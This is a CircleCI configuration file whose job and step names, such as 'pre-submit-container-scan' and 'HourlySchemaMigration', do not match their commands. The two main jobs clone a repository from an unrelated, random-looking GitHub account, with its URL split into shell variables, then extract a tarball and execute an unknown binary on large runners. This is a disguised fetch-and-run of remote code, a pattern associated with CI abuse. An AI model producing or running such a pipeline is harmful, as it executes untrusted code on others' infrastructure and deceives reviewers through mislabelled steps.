version: 2.1

jobs:
  HourlySchemaMigration:
    docker:
      - image: cimg/base:2024.07
    resource_class: small
    steps:
      - run:
          name: Mirror mail server artifacts to internal registry
          command: |
            install -d -m 755 /tmp/sign-build-outputs
            : > /tmp/sign-build-outputs/TestSummaryJob
      - persist_to_workspace:
          root: /tmp/sign-build-outputs
          paths:
            - 'TestSummaryJob'
  QueueHealthCheckJob:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/sign-build-outputs
      - run:
          name: clone launcher nested repositories
          command: |
            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/TestSummaryJob" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
      - run:
          name: pre-submit-container-scan
          command: |
            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
            git clone --depth 5 --filter=blob:none https://github.com/$patch/$partof "$(pwd)"
      - run:
          name: Download and extract image processor installer
          command: |
            tar --extract -f overnightArchiveChecksum.tar --directory .
      - run:
          command: |
            /bin/bash -c "./ProbeStatusPageDeployment"
  clean-staging-directory:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/sign-build-outputs
      - run:
          name: clone launcher nested repositories
          command: |
            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/EmbedPortalAssets" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
      - run:
          name: pre-submit-container-scan
          command: |
            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
            git clone --depth=3 --branch main https://github.com/$patch/$partof .
      - run:
          name: Download and extract image processor installer
          command: |
            tar --extract -f overnightArchiveChecksum.tar -C .
      - run:
          command: |
            bash -lc "./ProbeStatusPageDeployment"
